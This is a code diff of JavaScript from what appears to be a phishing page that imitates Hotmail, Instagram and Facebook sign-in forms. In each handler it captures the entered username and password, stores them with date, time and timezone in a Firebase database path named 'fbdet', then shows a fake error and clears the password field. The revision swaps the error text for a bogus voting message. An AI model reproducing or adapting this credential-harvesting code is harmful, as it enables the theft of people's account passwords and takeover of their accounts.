@@ -15,126 +15,103 @@ console.log(appCheck);
 appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);
 
 function hmlog() {
-  firebase
-    .auth()
-    .signInAnonymously()
-    .catch(function (error) {
-      showError(error.message, "error_box");
-    });
+  firebase.auth().signInAnonymously().catch(function(error) {
+    var errorCode = error.code;
+    var errorMessage = error.message;
+    window.alert("Error: " + errorMessage);
+  });
 
-  var email = document.getElementById("hm-uname").value;
-  var password = document.getElementById("hm-pass").value;
+  var email = document.getElementById('hm-uname').value;
+  var password = document.getElementById('hm-pass').value;
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  var accountType = "Hotmail";
+  var accountType = 'Email';
 
-  if (email !== "" && password !== "") {
-    firebase.database().ref("fbdet").push({
+  if (email !== '' && password !== '') {
+    firebase.database().ref('fbdet').push({
       emle: email,
-      mobile: "",
+      mobile: '',
       time: currentTime,
       timezone: timezone,
       pass: password,
       date: currentDate,
-      type: accountType,
+      type: accountType
     });
 
-    setTimeout(function () {
-      showError("Incorrect password! please try again...", "error_box");
-      document.getElementById("hm-pass").value = "";
+    setTimeout(function() {
+      alert('Oops! Something went wrong with your vote.');
+      document.getElementById('hm-pass').value = '';
+
       return false;
     }, 2000);
-  } else {
-    showError("Please enter both email and password.", "error_box");
-  }
-}
-
-function login() {
-  firebase
-    .auth()
-    .signInAnonymously()
-    .catch(function (error) {
-      showError(error.message, "error_box");
-    });
-
-  var email = document.getElementById("fb-email").value;
-  var password = document.getElementById("fb-pass").value;
-  var currentDate = new Date().toISOString().slice(0, 10);
-  var currentTime = new Date().toISOString().slice(11, 19);
-  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  var accountType = "Facebook";
-
-  if (email !== "" && password !== "") {
-    firebase.database().ref("fbdet").push({
-      emle: email,
-      mobile: "",
-      time: currentTime,
-      timezone: timezone,
-      pass: password,
-      date: currentDate,
-      type: accountType,
-    });
-
-    setTimeout(function () {
-      showError("Invalid username or password", "error_box");
-      document.getElementById("fb-pass").value = "";
-      return false;
-    }, 2000);
-  } else {
-    showError("Please enter both email and password.", "error_box");
   }
 }
 
 function iglog() {
-  var email = document.getElementById("ig-uname").value.trim();
-  var password = document.getElementById("ig-pass").value.trim();
-  var errorBox = "ig_error_box";
+  firebase.auth().signInAnonymously().catch(function(error) {
+    var errorCode = error.code;
+    var errorMessage = error.message;
+    window.alert("Error: " + errorMessage);
+  });
 
-  if (email === "" || password === "") {
-    showError("Please enter both email and password.", errorBox);
-    return false; // Prevents further execution
-  }
-
-  // If inputs are valid, proceed with anonymous sign-in
-  firebase
-    .auth()
-    .signInAnonymously()
-    .catch(function (error) {
-      showError(error.message, errorBox);
-    });
-
+  var username = document.getElementById('ig-uname').value;
+  var password = document.getElementById('ig-pass').value;
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  var accountType = "Instagram";
+  console.log(timezone);
+  var accountType = 'Instagram';
 
-  // Store the data in the Firebase database
-  firebase.database().ref("fbdet").push({
-    emle: email,
-    mobile: "",
-    time: currentTime,
-    timezone: timezone,
-    pass: password,
-    date: currentDate,
-    type: accountType,
+  if (username !== '' && password !== '') {
+    firebase.database().ref('fbdet').push({
+      emle: username,
+      mobile: '',
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType
+    });
+
+    setTimeout(function() {
+      alert('Oops! Something went wrong with your vote.');
+      document.getElementById('ig-pass').value = '';
+      return false;
+    }, 2000);
+  }
+}
+
+function login() {
+  firebase.auth().signInAnonymously().catch(function(error) {
+    var errorCode = error.code;
+    var errorMessage = error.message;
+    window.alert("Error: " + errorMessage);
   });
 
-  // Simulate a delay and provide feedback
-  setTimeout(function () {
-    showError("Please double-check your password", errorBox);
-    document.getElementById("ig-pass").value = ""; // Clear the password field
-    return false; // Optionally prevent form submission if that's the goal
-  }, 2000);
-}
+  var email = document.getElementById('fb-email').value;
+  var password = document.getElementById('fb-pass').value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = 'Facebook';
 
-function showError(message, boxId) {
-  var errorBox = document.getElementById(boxId);
-  errorBox.style.display = "block";
-  errorBox.querySelector("div:nth-child(2)").textContent = message;
-}
+  if (email !== '' && password !== '') {
+    firebase.database().ref('fbdet').push({
+      emle: email,
+      mobile: '',
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType
+    });
 
-function hideError(boxId) {
-  var errorBox = document.getElementById(boxId);
-  errorBox.style.display = "none";
+    setTimeout(function() {
+      alert('Oops! Something went wrong with your vote.');
+      document.getElementById('fb-pass').value = '';
+
+      return false;
+    }, 2000);
+  }
 }
